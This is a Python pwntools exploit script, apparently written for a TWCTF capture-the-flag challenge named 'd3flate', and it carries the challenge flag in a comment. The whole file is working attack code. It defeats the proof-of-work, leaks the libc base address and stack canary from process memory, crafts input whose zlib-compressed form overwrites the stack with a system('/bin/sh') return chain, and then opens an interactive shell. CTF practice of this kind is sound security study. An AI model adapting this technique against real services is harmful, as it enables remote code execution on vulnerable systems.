from pwn import *
import hashlib
import zlib
import time

REL_LIBC_SYSTEM = 0x40190
REL_LIBC_BINSH = 0x160a24
STACK_CANARY = 0x80
TIMEOUT = 60

def proof_of_work(conn):
    p = log.progress("Proof-of-work")
    line = conn.recvline()
    salt = line[30:38]
    p.status('salt="{}"'.format(salt))
    i = 0
    start_time = time.time()
    while True:
        h = hashlib.sha1(salt + str(i))
        # if h.digest()[:2] == "\x12\x34":
        #     break
        if h.digest()[:3] == "\x12\x34\x56":
            break
        i += 1
        if time.time() - start_time >= TIMEOUT - 1:
            p.failure("Timeout")
            return False
    conn.send(str(i) + "\n")
    result = conn.recvline()
    if result == "Welcome!\n":
        p.success(result)
        return True
    else:
        # Something wrong
        p.failure(result)
        exit(1)


class BitsInsufficientError(Exception):
    pass

class bitstring:
    def __init__(self, s):
        self.bits = ""
        for c in s:
            self.bits += "{0:08b}".format(ord(c))[::-1]
        self.pos = 0
        self.log = None
    
    def peek(self, n):
        if self.pos + n > len(self.bits):
            raise BitsInsufficientError()
        return self.bits[self.pos:self.pos+n]

    def get(self, n):
        if self.pos + n > len(self.bits):
            raise BitsInsufficientError()
        if self.log:
            self.log.write("{:04x}${}: {}\n".format(
                self.pos / 8, self.pos % 8,
                self.bits[self.pos:self.pos+n]))
        self.pos += n
        return self.bits[self.pos-n:self.pos]

    def insert(self, pos, b):
        self.bits = self.bits[:pos] + b + self.bits[pos:]

def extract_code(bits):
    if int(bits.peek(7), 2) < 0b0011000:
        return int(bits.get(7), 2) + 256
    elif int(bits.peek(8), 2) < 0b11000000:
        return int(bits.get(8), 2) - 0b00110000
    elif int(bits.peek(8), 2) < 0b11001000:
        return int(bits.get(8), 2) - 0b11000000 + 280
    else:
        return int(bits.get(9), 2) - 0b110010000 + 144

lbase = [3, 4, 5, 6, 7, 8, 9, 10, 11, 13, 15, 17, 19, 23, 27, 31,
         35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227, 258]
lext = [0, 0, 0, 0, 0, 0, 0, 0, 1, 1, 1, 1, 2, 2, 2, 2,
        3, 3, 3, 3, 4, 4, 4, 4, 5, 5, 5, 5, 0]
def code2length(code):
    assert(257 <= code <= 285)
    return lbase[code - 257], lext[code - 257]

dbase = [1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193,
         257, 385, 513, 769, 1025, 1537, 2049, 3073, 4097, 6145,
         8193, 12289, 16385, 24577]
dext = [0, 0, 0, 0, 1, 1, 2, 2, 3, 3, 4, 4, 5, 5, 6, 6,
        7, 7, 8, 8, 9, 9, 10, 10, 11, 11, 12, 12, 13, 13]
def code2dist(code):
    assert(0 <= code <= 29)
    return dbase[code], dext[code]

def parsetarget(bits):
    l = []
    while True:
        code = extract_code(bits)
        if code < 256:
            l.append(chr(code))
        elif code == 256:
            # End of Block
            break
        else:
            length, extra = code2length(code)
            if extra:
                ebits = bits.get(extra)
                length += int(ebits[::-1], 2)
            pbits = bits.get(5)
            dist, extra = code2dist(int(pbits, 2))
            if extra:
                ebits = bits.get(extra)
                dist += int(ebits[::-1], 2)
            l.append((length, dist))
    return l

def complement_first_codeword(bits, slide_size):
    if slide_size == 0:
        pre = ""
    elif slide_size <= 6:
        pre = "10000000"[:-slide_size]
    else: # slide_size == 7
        if bits.peek(1) == "0":
            pre = "1"
        else:
            pre = "0"
    bits.insert(0, pre)

def find_payload_sub(slide_size, target_pos, target):
    bits = bitstring(target + "\0"*3)
    complement_first_codeword(bits, slide_size)
    try:
        l = parsetarget(bits)
        if "0" * (len(bits.bits)-bits.pos) != bits.bits[bits.pos:]:
            return None
    except:
        return None
    
    badchars = set("\x78\x9c")
    back_length = None
    back_dist = None
    back_pos = None
    ng = False
    for i, c in enumerate(l):
        if isinstance(c, tuple):
            # at most one backword reference
            if back_pos is not None:
                ng = True
            # store backword reference information
            back_pos = i
            (back_length, back_dist) = c
            # input buffer will overflow
            if back_length > 128:
                ng = True
        else:
            badchars.add(c)
    if ng:
        return None
    #print l
    log.info("  candidate: %s", l)

    rchars8 = set([chr(c) for c in range(144)]) - badchars
    headchar = rchars8.pop()
    ruler8 = "".join(sorted(list(rchars8)))
    ruler8 += ruler8[:-1][::-1] # extend by inverse
    
    rchars9 = set([chr(c) for c in range(144, 256)]) - badchars
    ruler9 = "".join(sorted(list(rchars9)))
    
    ## first 9-bit code is moved to 0x81
    # text = ruler9[-1] + headchar * 11
    # ## aligend. pos = 6:0 ##
    # if slide_size == 0:
    #     stop = target_pos + 6
    # else:
    #     text += ruler9[:slide_size]
    #     stop = target_pos + 5
    # text += ruler8[len(text):stop]
    text = headchar * 11 # 4 bytes 7 bits
    if slide_size == 0:
        stop = target_pos + 5
    else:
        text += ruler9[:slide_size]
        stop = target_pos + 4
    text += ruler8[len(text):0x80]
    text += "\x78\x9c"
    text += ruler8[0x82:stop]
    ## complemented target is remained ##
    if back_pos is None:
        # without backword reference
        text += "".join(l)
    else:
        # with one backword reference
        for i in range(back_pos):
            text += l[i]
        if len(text) < back_dist:
            return None
        for j in xrange(back_length):
            text += text[-back_dist]
        for i in range(back_pos+1, len(l)):
            text += l[i]

    if len(text) >= 255:
        return None
    return text

# Flag is TWCTF{15264e77bbda63f7f6596cf66c92aa1981e0c07b}
def find_payload(target, target_pos):
    for slide in range(8):
        text = find_payload_sub(slide, target_pos, target)
        if text is None:
            continue
        
        comp = zlib.compress(text)
        if len(text) < len(comp):
            continue
        if comp[target_pos:target_pos+len(target)] == target:
            return text
        else:
            print "***** Something Wrong!!! *****"
    return None

def find_libc_base():
    conn = process("../d3flate")
    print file("/proc/%d/maps" % conn.proc.pid).read()
    if not proof_of_work(conn):
        conn.close()
        return

    conn.send("-1\n")
    length = int(conn.recvline())
    mem = zlib.decompress(conn.recvn(length))
    print hexdump(mem)
    libc_base = u32(mem[0x14:0x18]) - (0xf7588ac0 - 0xf73de000)
    log.info("LIBC_BASE = 0x%08x", libc_base)
    canary = u32(mem[0xc0:0xc4])
    log.info("CANARY = 0x%08x", canary)
    conn.close()

def try_pwn():
    conn = remote("localhost", 27025)
    #conn = process("../d3flate")
    if not proof_of_work(conn):
        conn.close()
        return

    conn.send("-1\n")
    length = int(conn.recvline())
    mem = zlib.decompress(conn.recvn(length))
    libc_base = u32(mem[0x14:0x18]) - (0xf7588ac0 - 0xf73de000)
    log.info("LIBC_BASE = 0x%08x", libc_base)
    canary = u32(mem[0xc0:0xc4])
    log.info("CANARY = 0x%08x", canary)

    p = log.progress("Find payload")
    for i in xrange(1024):
        target = ""
        target += p32(canary)
        target += p32(random.getrandbits(32))
        target += p32(random.getrandbits(32))
        target += p32(random.getrandbits(32))
        target += p32(libc_base + REL_LIBC_SYSTEM)
        target += p32(random.getrandbits(32))
        target += p32(libc_base + REL_LIBC_BINSH)
        p.info("TARGET = %s", repr(target))

        text = find_payload(target, STACK_CANARY)
        if text is not None:
            break
    if text is None:
        p.failure("Give up.")
        conn.close()
        return False
    p.success("Found in %dth time. TARGET = %s", i, repr(target))
    print "=== text ==="
    print hexdump(text)
    print "=== compressed ==="
    print hexdump(zlib.compress(text))
    conn.send("%d\n" % (-256 + len(text)))
    conn.send(text + "\n")
    line = conn.recvline()
    if line == "":
        conn.close()
        return
    print "=== recv ==="
    recvcomp = conn.recvn(int(line))
    print hexdump(recvcomp)
    print "=== recv uncompressed ==="
    print hexdump(zlib.decompress(recvcomp))

    conn.send("3\n")
    conn.send("Bye\n")
    conn.interactive()
    exit(0)

#find_libc_base()
while True:
    try_pwn()
